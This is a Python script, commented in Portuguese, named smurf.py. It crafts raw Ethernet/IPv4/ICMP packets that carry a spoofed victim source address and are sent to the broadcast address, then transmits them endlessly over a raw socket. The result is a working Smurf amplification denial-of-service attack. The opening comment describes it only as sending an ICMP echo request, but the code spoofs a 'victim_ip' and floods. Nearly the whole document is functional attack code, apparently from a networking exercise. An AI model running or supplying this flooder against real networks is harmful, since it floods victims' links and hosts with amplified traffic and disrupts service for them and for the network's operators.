#Envia um pacote ICMP Echo Request para outra maquina

#Exemplo de uso: sudo python3 smurf.py enp0s3 a4:1f:72:f5:90:b7 10.0.2.15
#Exemplo de uso: sudo python3 smurf.py enp4s0 a4:1f:72:f5:90:a1 10.32.143.65

import struct
import socket
import sys
#===============================================================
#funcoes auxiliares

# Checksum quebra todo o header em numeros de 2 bytes (unsigned shorts) e 
# soma todos eles entregando como resultado um unsigned short. Se ao final 
# da soma restar algum carry que extrapole os limites do short, este carry 
# eh somado ao resultado como um novo numero. Ao final o resultado eh 
# retornado em complemento de 1 (bits invertidos). Como em python o 
# resultado usa 32 bits, esta inversao retorna um numero fora do escopo de 
# um short (zero ficaria 0xffffffff por exemplo). Para evitar complicacoes, 
# uma operacao and eh usada com uma mascara 0xffff a fim de manter apenas os
# primeiros 16 bits relevantes.
def checksum_icmp(header):
  shorts = struct.unpack('!HHHH', header)
  sum = 0
  for n in shorts:
    print(n)
    sum = sum + n
  print('sum', sum)
  sum = sum + (sum>>16) #se houver carry, soma-o como se fosse um novo numero
  print('sum2', sum)
  sum = (~sum) & 0xffff
  print('sum3', sum)
  return sum

def checksum_ip(header):
  shorts = struct.unpack('!HHHHHHHHHH', header)
  sum = 0
  for n in shorts:
    sum = sum + n
  sum = sum + (sum>>16) #se houver carry, soma-o como se fosse um novo numero
  return (~sum) & 0xffff

# mac = string contendo um endereco mac
# retorno = string em que cada caractere corresponde a um byte do mac
def mac2bytes(mac):
  return bytes.fromhex((mac.replace(':', '')))

def string2hexip(sip):
  ns = sip.split('.')
  ns2 = []
  for n in ns:
    ns2.append(int(n))
  return struct.pack('!BBBB', ns2[0], ns2[1], ns2[2], ns2[3])
  
def string2bytesip(ip):
  return bytes(map(int, ip.split('.')))
#===============================================================






#===============================================================
#main

def main():
  if len(sys.argv) < 4:
	  print("Uso: python smurf.py <interface> <MAC deste host> <IP alvo>")
	  print('Exemplo de uso: sudo python3 smurf.py enp0s3 a4:1f:72:f5:90:b7 10.0.2.15')
	  exit()
  
  victim_ip = string2bytesip(sys.argv[3])
  
  #ethernet header
  source_mac = mac2bytes(sys.argv[2])
  target_mac = mac2bytes("ff:ff:ff:ff:ff:ff") #6B
  eth_type = 0x0800 #2B ipv4
  eth_header = struct.pack("!6s6sH", target_mac, source_mac, eth_type)

  #ip header
  ver_ihl = 0x45 #1B 4: ipv4,  5: numero de palavras de 32 bits neste header
  tos = 0 #1B
  total_length = 28 #2B tamanho em bytes do header
  identification = 1 #2B
  flags_offset = 0x4000 #2B (bit don't fragment ligado)
  ttl = 64 #1B
  protocol = 1 #1B icmp
  temp_checksum = 0 #2B
  source_ip = victim_ip #4B spoof
  broadcast_ip = string2bytesip("255.255.255.255") #4B
  ip_header = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_length,
                          identification, flags_offset, ttl, protocol,
                          temp_checksum, source_ip, broadcast_ip)
  true_checksum = checksum_ip(ip_header)
  ip_header = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_length,
                          identification, flags_offset, ttl, protocol,
                          true_checksum, source_ip, broadcast_ip)

  #icmp header
  icmp_type = 8 #1B
  code = 0 #1B
  temp_checksum = 0 #2B
  identifier = 0xffff #2B
  sequence = 0x0123 #2B
  true_checksum = checksum_icmp(struct.pack('!BBHHH', icmp_type, code, temp_checksum, identifier, sequence))
  icmp_header = struct.pack('!BBHHH', icmp_type, code, true_checksum, identifier, sequence)

  #packet completo
  packet = eth_header + ip_header + icmp_header

  #abre socket
  rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
  interface = sys.argv[1]
  rawSocket.bind((interface, socket.htons(0x0800)))
  
  rawSocket.send(packet)
  
  
  while True:  
    rawSocket.send(packet)
  
if __name__== '__main__':
  main()
